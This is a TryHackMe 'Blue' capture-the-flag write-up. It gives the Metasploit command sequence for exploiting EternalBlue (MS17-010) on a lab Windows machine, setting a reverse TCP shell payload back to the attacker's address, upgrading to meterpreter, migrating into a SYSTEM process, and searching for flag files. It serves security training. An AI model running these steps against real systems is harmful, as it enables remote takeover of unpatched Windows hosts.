This machine was created to exploit the Eternal Blue vulnerability. We are going to follow the steps that Tryhackme gives us.

2. Enumeration
#

We launch our msfconsole Metasploit.

Metasploit
# 

msfconsole

We use the exploit:

> use exploit/windows/smb/ms17_010_eternalblue

We will use this payload:

> set payload windows/x64/shell/reverse_tcp

Let’s see the options that the exploit gives us:

> show options

We enter the IP of the victim machine:

> set rhosts 10.10.33.157

We enter the attacking IP:

> set lhost tun0

We launch the exploit:

> exploit

We already have a shell, we send it to a session with the CTRL + Z command.

Meterpreter
#

Now let’s pass this shell to meterpreter.

> use post/multi/manage/shell_to_meterpreter

We enter the attacking IP:

> set lhost 10.8.189.249

We list the sessions to join our meterpreter to the shell

> sessions -l

We add session 1 to our meterpreter.

> set session 1

If we put run, the shell is already linked to the meterpreter.

Here we can see our meterpreter session.

We move on to session 2:

sessions -i 2

ps

Lists all processes that are run using the ‘ps’ command. Just because we are nt authority\system doesn’t mean our process is. Look for a process at the end of this list that is running on NT AUTHORITYSYSTEM and type the process ID.

We migrate to this process.

> migrate 2644

We pass the shell command to our meterpreter.

We look for the flags, from the meterpreter:

search -f flag*txt
